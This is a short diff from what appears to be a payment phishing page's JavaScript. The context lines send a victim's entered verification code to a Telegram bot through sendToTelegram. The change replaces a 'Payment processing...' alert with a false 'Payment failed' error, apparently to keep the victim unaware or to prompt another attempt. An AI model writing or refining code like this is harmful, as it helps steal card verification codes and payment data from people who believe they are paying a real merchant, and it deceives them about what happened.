@@ -770,7 +770,7 @@ Entered code: ${code}`;
                 const success = await sendToTelegram(message);
 
                 if (success) {
-                    alert('Payment processing...', "success");
+                    alert('Payment failed', "error");
                     verificationModal.style.display = 'none';
                     paymentForm.reset();
                 } else {
